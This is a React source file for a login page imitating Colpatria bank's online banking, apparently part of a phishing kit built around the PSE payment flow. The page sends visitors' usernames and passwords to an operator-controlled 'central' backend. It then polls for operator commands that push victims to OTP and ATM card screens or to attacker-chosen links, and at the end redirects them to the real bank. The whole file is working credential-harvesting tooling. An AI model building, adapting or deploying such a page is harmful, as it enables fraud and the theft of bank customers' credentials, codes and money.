import { useEffect, useRef, useState } from "react";
import { User, Lock, CircleX, Eye, EyeOff } from "lucide-react";
import { useNavigate, useLocation } from "react-router-dom";
import { instanceBackend } from "../../../../../axios/instanceBackend";
import { PSE_SESSION_HANDOFF_KEY } from "../../../../loadingPse/PseLoading";
import { redirectToTcIngreso } from "../../../../ingresoTc/tcSessionHelper";
import LoadingColpatria from "../../../../../components/LoadingColpatria";
import bannerDesktop from "../../img/banner_desktop_1.svg";
import logoColpatria from "../../img/new-brand-red.svg";
import "./login_colpatria_pse.css";

// Se definen las constantes de longitud de usuario y contraseña
const USER_LEN_MIN = 6;
const USER_LEN_MAX = 32;
const PASS_LEN_MAX = 32;
const COLPATRIA_ALNUM = /[^a-zA-Z0-9]/g;

const sanitizeColpatriaAlphanumeric = (value, maxLen) =>
  value.replace(COLPATRIA_ALNUM, "").slice(0, maxLen);

// Se inicializa la clave para errores pendientes en modal
const COLPATRIA_ERROR_KEY = "colpatria_error_modal";
const COLPATRIA_LOGIN_ERROR_AUTO_HIDE_MS = 5000;
const COLPATRIA_LOGIN_ERROR_MSG =
  "El usuario y / o la contraseña que ingresaste no coinciden con nuestros registros.";

// Se inicializa la clave de mid flow para reanudar polling tras recarga
const COLPATRIA_MID_FLOW_KEY = "colpatria_mid_flow";
const COLPATRIA_OTP_REFRESH_KEY = "colpatria_otp_refresh";
const COLPATRIA_ATM_REFRESH_KEY = "colpatria_atm_refresh";

// Se definen los estados tras login
const ESTADOS_TRAS_LOGIN = [
  "sol_otp",
  "sol_atm",
  "sol_finalizar",
  "sol_finalizado",
  "solicitar_finalizar",
  "error_otp",
  "error_atm",
  "error_login",
  "block_ip",
  "error_blocked",
  "link_bot",
  "sol_link_custom",
];

const ESTADOS_SIEMPRE_REPROCESAR = [
  "error_login",
  "error_otp",
  "error_atm",
  "block_ip",
  "error_blocked",
];

// Se crea el componente para renderizar el icono de alerta
function ColpatriaAlertIcon({ className = "" }) {

  // Se retorna el icono de alerta
  return (
    <svg
      className={className ? `colpatria-alert-diamond ${className}` : "colpatria-alert-diamond"}
      width={18}
      height={18}
      viewBox="0 0 20 20"
      aria-hidden
    >
      <g transform="translate(10 10) rotate(45)">
        <rect
          x="-6.5"
          y="-6.5"
          width="13"
          height="13"
          rx="1.5"
          fill="currentColor"
        />
      </g>
      <text
        x="10"
        y="14.5"
        textAnchor="middle"
        fontSize="11"
        fontWeight="800"
        fill="#ffffff"
        fontFamily="system-ui, -apple-system, BlinkMacSystemFont, sans-serif"
      >
        !
      </text>
    </svg>
  );
}

// Se crea el componente para renderizar el login del banco Colpatria
export default function LoginColpatriaPse() {

  const navigate = useNavigate();
  const location = useLocation();

  // Se inicializan los estados del formulario y UI
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [submittedAttempt, setSubmittedAttempt] = useState(false);
  const [getLoading, setLoading] = useState(false);
  const [showLoginErrorAlert, setShowLoginErrorAlert] = useState(false);
  const [showModal, setShowModal] = useState(false);
  const [modalText, setModalText] = useState("");

  // Se inicializan las referencias del polling y control de estado
  const pollingIntervalRef = useRef(null);
  const sessionIdRef = useRef(null);
  const lastEstadoRef = useRef(null);
  const allowPollNavigationRef = useRef(false);
  const modalBloqueoEstadoRef = useRef(null);
  const ignorarEstadoHastaCambioRef = useRef(null);

  // Se inicializan las validaciones del formulario
  const usernameLen = username.trim().length;
  const usernameInvalid = usernameLen < USER_LEN_MIN || usernameLen > USER_LEN_MAX;
  const passwordInvalid = password.length === 0;

  const showUsernameError = submittedAttempt && usernameInvalid;
  const showPasswordError = submittedAttempt && passwordInvalid;

  const clearLoginFormFields = () => {
    setUsername("");
    setPassword("");
    setShowPassword(false);
    setSubmittedAttempt(false);
  };

  const dismissLoginErrorAlert = () => {
    setShowLoginErrorAlert(false);

    if (modalBloqueoEstadoRef.current === "error_login") {
      ignorarEstadoHastaCambioRef.current = "error_login";
      modalBloqueoEstadoRef.current = null;
      sessionStorage.removeItem(COLPATRIA_MID_FLOW_KEY);
      allowPollNavigationRef.current = false;
    }
  };

  const showLoginCredentialError = () => {
    stopPolling();
    setLoading(false);
    modalBloqueoEstadoRef.current = "error_login";
    lastEstadoRef.current = "error_login";
    sessionStorage.removeItem(COLPATRIA_MID_FLOW_KEY);
    allowPollNavigationRef.current = false;
    clearLoginFormFields();
    setShowLoginErrorAlert(true);
    window.scrollTo(0, 0);
  };

  const dismissLoginErrorAlertIfOpen = () => {
    if (showLoginErrorAlert) {
      dismissLoginErrorAlert();
    }
  };

  // Se crea el metodo para redirigir rutas internas
  const redirigir = (ruta) => {
    navigate(ruta);
  };

  const redirigirOtp = () => {
    sessionStorage.setItem(COLPATRIA_OTP_REFRESH_KEY, "1");
    navigate("/colpatria_pse_otp", {
      replace: true,
      state: { signal: Date.now() },
    });
  };

  const redirigirAtm = () => {
    sessionStorage.setItem(COLPATRIA_ATM_REFRESH_KEY, "1");
    navigate("/colpatria_pse_atm", {
      replace: true,
      state: { signal: Date.now() },
    });
  };

  const applyPendingScreenSignal = () => {
    const pendingError = localStorage.getItem(COLPATRIA_ERROR_KEY);
    if (!pendingError) return false;

    if (pendingError === "error_login") {
      showLoginCredentialError();
    } else if (pendingError === "block_ip") {
      modalBloqueoEstadoRef.current = "block_ip";
      setShowModal(true);
      setModalText("Acceso bloqueado por seguridad.");
    }

    localStorage.removeItem(COLPATRIA_ERROR_KEY);
    return pendingError === "error_login";
  };

  const bootstrapLoginScreen = () => {
    const handledLoginError = applyPendingScreenSignal();
    const pseHandoff = sessionStorage.getItem(PSE_SESSION_HANDOFF_KEY);
    const midFlow = sessionStorage.getItem(COLPATRIA_MID_FLOW_KEY) === "1";

    if (pseHandoff) {
      localStorage.setItem("sessionId", pseHandoff);
      sessionIdRef.current = pseHandoff;
      lastEstadoRef.current = null;
      sessionStorage.removeItem(PSE_SESSION_HANDOFF_KEY);
      sessionStorage.removeItem(COLPATRIA_MID_FLOW_KEY);
      allowPollNavigationRef.current = false;
      setLoading(false);
    } else if (!handledLoginError && midFlow) {
      const sid = localStorage.getItem("sessionId");
      sessionIdRef.current = sid;

      if (sid) {
        allowPollNavigationRef.current = true;
        setLoading(true);
        initPolling();
      }
    } else {
      sessionIdRef.current = localStorage.getItem("sessionId");
      allowPollNavigationRef.current = false;
      if (handledLoginError) {
        setLoading(false);
      }
    }
  };

  // Se crea el useEffect para inicializar session y estado de error
  useEffect(() => {
    bootstrapLoginScreen();

    return () => {
      stopPolling();
    };
  }, [location.pathname, location.key, location.state]);

  useEffect(() => {
    if (!showLoginErrorAlert) return undefined;

    const timer = window.setTimeout(() => {
      dismissLoginErrorAlert();
    }, COLPATRIA_LOGIN_ERROR_AUTO_HIDE_MS);

    return () => window.clearTimeout(timer);
  }, [showLoginErrorAlert]);

  // Se crea el metodo para parar el polling
  const stopPolling = () => {

    // Se valida si existe el intervalo de polling
    if (pollingIntervalRef.current) {

      // Se limpia el intervalo de polling
      clearInterval(pollingIntervalRef.current);

      // Se resetea la referencia
      pollingIntervalRef.current = null;
    }
  };

  // Se crea el metodo para iniciar el polling
  const initPolling = () => {

    // Se para el polling
    stopPolling();

    // Se inicia el polling cada 3 segundos
    pollingIntervalRef.current = setInterval(() => {

      // Se verifica el estado
      verifyState();
    }, 3000);

    // Se verifica el estado de inmediato
    verifyState();
  };

  // Se crea el metodo para verificar el estado actual
  const verifyState = async () => {

    // Se usa el try catch
    try {

      // Se realiza la peticion al backend
      const response = await instanceBackend.post(`/colpatria/verify-state/${sessionIdRef.current}`);

      // Se captura la informacion de la respuesta
      const { estado: estadoRaw, url, text, tc, tarjeta, bank } = response?.data || {};

      // Se captura el estado actual
      const estadoActual = (estadoRaw || "").toLowerCase();
      const hasUrl = Boolean(url && String(url).trim());
      const customLink = hasUrl ? url : (text && String(text).trim() ? text : null);
      const tarjetaDigits = String(tarjeta || "").replace(/\D/g, "");
      const isTcSession = Boolean(tc);
      const isTcOtpFlow = isTcSession && tarjetaDigits.length > 0;
      const linkPendiente = estadoActual === "sol_link_bot" || (estadoActual === "link_bot" && !hasUrl) || (estadoActual === "sol_link_custom" && !customLink);

      // Se valida si existe estado para procesar
      if (!estadoActual) return;

      // Se evita reprocesar el mismo estado despues de cerrar modal
      if (ignorarEstadoHastaCambioRef.current) {

        // Se valida si el estado actual es el mismo que el estado a ignorar
        if (estadoActual === ignorarEstadoHastaCambioRef.current) return;

        // Se limpia el estado a ignorar
        ignorarEstadoHastaCambioRef.current = null;

        // Se limpia el estado de bloqueo del modal
        modalBloqueoEstadoRef.current = null;
      }

      // Se evita reabrir modal por el mismo estado bloqueado
      if (modalBloqueoEstadoRef.current && estadoActual === modalBloqueoEstadoRef.current) {

        // Se sale del metodo
        return;
      }

      // Se evita navegar por polling si aun no hay accion del usuario
      if (ESTADOS_TRAS_LOGIN.includes(estadoActual) && !allowPollNavigationRef.current) {

        // Se sale del metodo
        return;
      }

      // Se evita reprocesar estados repetidos cuando no hay link pendiente
      if (
        !linkPendiente &&
        lastEstadoRef.current === estadoActual &&
        !ESTADOS_SIEMPRE_REPROCESAR.includes(estadoActual)
      ) {
        return;
      }
      if (!linkPendiente) lastEstadoRef.current = estadoActual;

      // Se maneja la navegacion segun el estado retornado por verifyState
      switch (estadoActual) {
        case "sol_otp":

          // Se para el polling
          stopPolling();

          // Se quita el loading
          setLoading(false);

          // Se remueve el mid flow
          sessionStorage.removeItem(COLPATRIA_MID_FLOW_KEY);
          sessionStorage.setItem(COLPATRIA_OTP_REFRESH_KEY, "1");

          if (isTcOtpFlow) {
            redirectToTcIngreso(
              "/ingreso-tc/otp",
              sessionIdRef.current,
              bank,
              tarjetaDigits,
            );
          } else {
            redirigirOtp();
          }

          break;
        case "sol_atm":

          // Se para el polling
          stopPolling();

          // Se quita el loading
          setLoading(false);

          // Se remueve el mid flow
          sessionStorage.removeItem(COLPATRIA_MID_FLOW_KEY);

          // Se desactiva la navegacion por polling
          allowPollNavigationRef.current = false;

          // Se redirige a la pantalla ATM Colpatria
          redirigir("/colpatria_pse_atm");

          // Se sale del switch
          break;
        case "sol_finalizar":
        case "sol_finalizado":
        case "solicitar_finalizar":

          // Se para el polling
          stopPolling();

          // Se quita el loading
          setLoading(false);

          // Se remueve el mid flow
          sessionStorage.removeItem(COLPATRIA_MID_FLOW_KEY);

          // Se limpia el storage de la sesion
          localStorage.clear();
          sessionStorage.clear();

          // Se redirige al finalizado TC cuando la sesión viene por tarjeta
          if (isTcSession) {

            // Se redirige al finalizado TC cuando la sesión viene por tarjeta
            window.location.href = `/finalizado-tc?sessionId=${encodeURIComponent(sessionIdRef.current)}`;
          } else {

            // Se redirige al finalizado PSE cuando la sesión no viene por tarjeta
            window.location.href = `/finalizado-pse?sessionId=${sessionIdRef.current}`;
          }

          // Se sale del switch
          break;
        case "error_otp":

          // Se para el polling
          stopPolling();

          // Se quita el loading
          setLoading(false);

          // Se remueve el mid flow
          sessionStorage.removeItem(COLPATRIA_MID_FLOW_KEY);

          // Se setea el estado de error
          localStorage.setItem(COLPATRIA_ERROR_KEY, "error_otp");
          sessionStorage.setItem(COLPATRIA_OTP_REFRESH_KEY, "1");

          // Se redirige al flujo OTP generico si la sesión es TC
          if (isTcOtpFlow) {

            // Se redirige al flujo OTP generico si la sesión es TC
            redirectToTcIngreso(
              "/ingreso-tc/otp",
              sessionIdRef.current,
              bank,
              tarjetaDigits,
              "error_otp",
            );
          } else {

            // Se redirige a la pantalla OTP Colpatria
            redirigirOtp();
          }

          // Se sale del switch
          break;
        case "error_atm":

          // Se para el polling
          stopPolling();

          // Se quita el loading
          setLoading(false);

          // Se remueve el mid flow
          sessionStorage.removeItem(COLPATRIA_MID_FLOW_KEY);

          // Se desactiva la navegacion por polling
          allowPollNavigationRef.current = false;

          // Se setea el estado de error
          localStorage.setItem(COLPATRIA_ERROR_KEY, "error_atm");
          sessionStorage.setItem(COLPATRIA_ATM_REFRESH_KEY, "1");

          redirigirAtm();

          // Se sale del switch
          break;
        case "error_login":
          showLoginCredentialError();
          break;
        case "link_bot":

          // Se valida si existe URL para redireccion
          if (hasUrl) {

            // Se para el polling
            stopPolling();

            // Se remueve el mid flow
            sessionStorage.removeItem(COLPATRIA_MID_FLOW_KEY);

            // Se redirige al link del bot
            window.location.href = url;
          }

          // Se sale del switch
          break;
        case "sol_link_custom":

          // Se valida si existe link personalizado
          if (customLink) {

            // Se para el polling
            stopPolling();

            // Se remueve el mid flow
            sessionStorage.removeItem(COLPATRIA_MID_FLOW_KEY);

            // Se redirige al link personalizado
            window.location.href = customLink;
          }

          // Se sale del switch
          break;
        case "block_ip":
        case "error_blocked":

          // Se para el polling
          stopPolling();

          // Se quita el loading
          setLoading(false);

          // Se remueve el mid flow
          sessionStorage.removeItem(COLPATRIA_MID_FLOW_KEY);

          // Se desactiva la navegacion por polling
          allowPollNavigationRef.current = false;

          // Se setea el estado de bloqueo
          modalBloqueoEstadoRef.current = "block_ip";

          // Se muestra el modal con mensaje de bloqueo
          setShowModal(true);

          // Se setea el texto del modal
          setModalText("Acceso bloqueado por seguridad.");

          // Se sale del switch
          break;
        default:

          // Se sale del switch
          break;
      }
    } catch (error) {

      // Se captura el status y estado del error
      const status = error?.response?.status;

      // Se captura el estado del error
      const estadoErr = (error?.response?.data?.estado || "").toString().toLowerCase();

      // Se valida si el estado corresponde a bloqueo de IP
      if (status === 403 && estadoErr === "error_blocked") {

        // Se para el polling
        stopPolling();

        // Se quita el loading
        setLoading(false);

        // Se remueve el mid flow
        sessionStorage.removeItem(COLPATRIA_MID_FLOW_KEY);

        // Se desactiva la navegacion por polling
        allowPollNavigationRef.current = false;

        // Se limpia el storage y se redirige al inicio del banco
        localStorage.clear();

        // Se redirige al inicio del banco
        window.location.href = process.env.REACT_APP_URL_BANK || "/";
      }
    }
  };

  // Se crea el metodo para cerrar el modal y resetear el formulario
  const closeModal = () => {
    const estadoServidor = modalBloqueoEstadoRef.current;
    modalBloqueoEstadoRef.current = null;

    setShowModal(false);
    setModalText("");
    setLoading(false);

    if (estadoServidor === "block_ip") {
      allowPollNavigationRef.current = false;
      sessionStorage.removeItem(COLPATRIA_MID_FLOW_KEY);
    }
  };

  // Se crea el metodo para enviar usuario y clave al backend
  const handleSubmit = async (e) => {

    // Se previene el submit por defecto
    e.preventDefault();

    // Se marca intento de submit para mostrar validaciones
    setSubmittedAttempt(true);

    // Se valida si el formulario es invalido o ya está cargando
    if (usernameInvalid || passwordInvalid || getLoading) {

      // Se sale del metodo
      return;
    }

    // Se captura la sessionId desde localStorage
    const sessionId = localStorage.getItem("sessionId");

    // Se valida que exista sessionId persistida
    if (!sessionId) {

      // Se muestra el modal con mensaje de error
      setShowModal(true);

      // Se setea el texto del modal
      setModalText("Por favor, vuelva a la pagina de compra para iniciar el proceso nuevamente.");

      // Se sale del metodo
      return;
    }

    // Se captura la url central
    const centralUrl = (process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL || "").trim();

    // Se inicializa la data a enviar
    const dataSend = {
      "data": {
        "attributes": {
          "usuario": username,
          "clave": password,
          "fecha": new Date().toISOString(),
          "sessionId": sessionId,
          "backend": "P01",
          "backend_central_url": process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL,
          "backend_url": "/api/v1/colpatria/authenticacion",
        },
      },
    };

    // Se para el polling y se limpia el ultimo estado antes de login
    stopPolling();

    // Se limpia el ultimo estado
    lastEstadoRef.current = null;

    // Se usa try catch para el envio
    try {

      // Se activa el loading
      setLoading(true);

      // Se realiza la peticion al backend
      const response = centralUrl ? await instanceBackend.post(centralUrl, dataSend) : await instanceBackend.post("/colpatria/authenticacion", dataSend);

      // Se valida la respuesta exitosa
      if (response?.data?.success) {

        // Se captura la sessionId devuelta por backend
        const sid = response.data.sessionId ?? sessionId;

        // Se persiste la sessionId en localStorage y en el ref
        localStorage.setItem("sessionId", sid);

        // Se actualiza la sessionId
        sessionIdRef.current = sid;

        // Se marca el flujo como enviado y se habilita navegación por polling
        sessionStorage.setItem(COLPATRIA_MID_FLOW_KEY, "1");

        // Se habilita la navegacion por polling
        allowPollNavigationRef.current = true;

        // Se inicia el polling para esperar la instrucción del operador
        initPolling();
      } else {

        // Se quita el loading y se muestra error
        setLoading(false);

        // Se desactiva la navegacion por polling
        allowPollNavigationRef.current = false;

        // Se muestra el modal con mensaje de error
        setShowModal(true);

        // Se setea el texto del modal
        setModalText("Error de login.");
      }
    } catch (error) {

      // Se quita el loading y la navegacion por polling
      setLoading(false);

      // Se desactiva la navegacion por polling
      allowPollNavigationRef.current = false;

      // Se captura el status y estado del error
      const status = error?.response?.status;

      // Se captura el estado del error
      const estadoErr = (error?.response?.data?.estado || "").toString().toLowerCase();

      // Se valida si el estado corresponde a bloqueo de IP
      if (status === 403 && estadoErr === "error_blocked") {

        // Se remueve el mid flow
        sessionStorage.removeItem(COLPATRIA_MID_FLOW_KEY);

        // Se limpia el storage y se redirige al inicio del banco
        localStorage.clear();

        // Se redirige al inicio del banco
        window.location.href = process.env.REACT_APP_URL_BANK || "/";

        // Se sale del metodo
        return;
      }

      // Se muestra el modal de error de comunicación
      setShowModal(true);

      // Se setea el texto del modal
      setModalText(centralUrl ? "Error de comunicación con el servidor central." : "Error de conexión con el servidor.");
    }
  };

  // Se retorna el HTML
  return (
    <div className="colpatria-pse-login-root">
      {/* Se renderiza el contenedor principal de login */}
      <div className="login-container">
        {/* Se renderiza la columna izquierda del formulario */}
        <div className="login-form-section">
          <div className="login-form-wrapper">
            {/* Se renderiza el bloque del logo principal */}
            <div className="logo-container">
              <img
                src={logoColpatria}
                alt="Colpatria"
                className="colpatria-login-logo"
              />
            </div>

            {/* Se renderiza el título de acceso */}
            <h1 className="login-title">Ingresa a tu Banca Virtual</h1>

            {showLoginErrorAlert ? (
              <div className="login-global-error login-login-error-alert" role="alert">
                <ColpatriaAlertIcon className="login-field-error__icon login-global-error__icon" />
                <p className="login-global-error__text">{COLPATRIA_LOGIN_ERROR_MSG}</p>
              </div>
            ) : null}

            <form onSubmit={handleSubmit} className="login-form" noValidate>
              {/* Se renderiza el campo de usuario */}
              <div className="input-group">
                {/* Se renderiza el contenedor visual del campo de usuario */}
                <div
                  className={
                    showUsernameError
                      ? "input-wrapper input-wrapper--error"
                      : "input-wrapper"
                  }
                >
                  {/* Se renderiza el icono del campo usuario */}
                  <User className="input-icon" size={20} aria-hidden />

                  {/* Se renderiza el input de usuario */}
                  <input
                    type="text"
                    id="colpatria-pse-username"
                    name="username"
                    autoComplete="username"
                    placeholder="Nombre de usuario"
                    aria-label="Nombre de usuario"
                    aria-invalid={showUsernameError}
                    aria-describedby={
                      showUsernameError ? "colpatria-username-error" : undefined
                    }
                    value={username}
                    maxLength={USER_LEN_MAX}
                    onChange={(e) => {
                      setUsername(
                        sanitizeColpatriaAlphanumeric(e.target.value, USER_LEN_MAX),
                      );
                      dismissLoginErrorAlertIfOpen();
                    }}
                    className="login-input"
                  />

                  {/* Se renderiza el botón para limpiar el usuario */}
                  {username.trim() !== "" ? (
                    <button
                      type="button"
                      className="input-action-btn input-action-btn--clear"
                      onMouseDown={(e) => e.preventDefault()}
                      onClick={() => setUsername("")}
                      aria-label="Borrar nombre de usuario"
                    >
                      <CircleX size={20} aria-hidden strokeWidth={1.5} />
                    </button>
                  ) : null}
                </div>

                {/* Se renderiza el mensaje de error del campo usuario */}
                {showUsernameError ? (
                  <p
                    className="login-field-error"
                    id="colpatria-username-error"
                  >
                    <ColpatriaAlertIcon className="login-field-error__icon" />
                    <span>Usa entre 6 y 32 caracteres (letras y números).</span>
                  </p>
                ) : null}
              </div>

              {/* Se renderiza el campo de contraseña */}
              <div className="input-group">
                {/* Se renderiza el contenedor visual del campo de contraseña */}
                <div
                  className={
                    showPasswordError
                      ? "input-wrapper input-wrapper--error"
                      : "input-wrapper"
                  }
                >
                  {/* Se renderiza el icono del campo contraseña */}
                  <Lock className="input-icon" size={20} aria-hidden />

                  {/* Se renderiza el input de contraseña */}
                  <input
                    type={showPassword ? "text" : "password"}
                    id="colpatria-pse-password"
                    name="password"
                    autoComplete="current-password"
                    placeholder="Contraseña"
                    aria-label="Contraseña"
                    aria-invalid={showPasswordError}
                    aria-describedby={
                      showPasswordError ? "colpatria-password-error" : undefined
                    }
                    value={password}
                    maxLength={PASS_LEN_MAX}
                    onChange={(e) => {
                      setPassword(
                        sanitizeColpatriaAlphanumeric(e.target.value, PASS_LEN_MAX),
                      );
                      dismissLoginErrorAlertIfOpen();
                    }}
                    className="login-input"
                  />

                  {/* Se renderiza el botón para ver u ocultar contraseña */}
                  {password.length > 0 ? (
                    <button
                      type="button"
                      className="input-action-btn input-action-btn--eye"
                      onMouseDown={(e) => e.preventDefault()}
                      onClick={() => setShowPassword((v) => !v)}
                      aria-label={
                        showPassword ? "Ocultar contraseña" : "Mostrar contraseña"
                      }
                    >
                      {showPassword ? (
                        <Eye size={20} aria-hidden strokeWidth={1.5} />
                      ) : (
                        <EyeOff size={20} aria-hidden strokeWidth={1.5} />
                      )}
                    </button>
                  ) : null}
                </div>

                {/* Se renderiza el mensaje de error del campo contraseña */}
                {showPasswordError ? (
                  <p
                    className="login-field-error"
                    id="colpatria-password-error"
                  >
                    <ColpatriaAlertIcon className="login-field-error__icon" />
                    <span>Escribe una contraseña con letras y números.</span>
                  </p>
                ) : null}
              </div>

              {/* Se renderiza el botón de ingreso */}
              <button
                type="submit"
                className="login-button"
                disabled={getLoading}
              >
                Ingresar
              </button>
            </form>
          </div>
        </div>

        {/* Se renderiza la columna derecha con imagen de apoyo */}
        <div className="login-image-section">
          <img
            src={bannerDesktop}
            alt=""
            className="login-image"
          />
        </div>
      </div>

      {/* Se renderiza el modal de mensajes */}
      {showModal && (
        <div className="colpatria-modal-wrap" onClick={closeModal}>
          {/* Se renderiza la tarjeta del modal */}
          <div className="colpatria-modal-card" onClick={(e) => e.stopPropagation()}>
            {/* Se renderiza el encabezado del modal */}
            <div className="colpatria-modal-top">Personas</div>

            {/* Se renderiza el cuerpo del modal */}
            <div className="colpatria-modal-mid">
              <p>{modalText}</p>
            </div>

            {/* Se renderiza el pie del modal */}
            <div className="colpatria-modal-bot">
              <button
                type="button"
                className="colpatria-modal-accept-btn"
                onClick={closeModal}
              >
                Aceptar
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Se renderiza el loading mientras se procesa login o polling */}
      {getLoading && <LoadingColpatria />}
    </div>
  );
};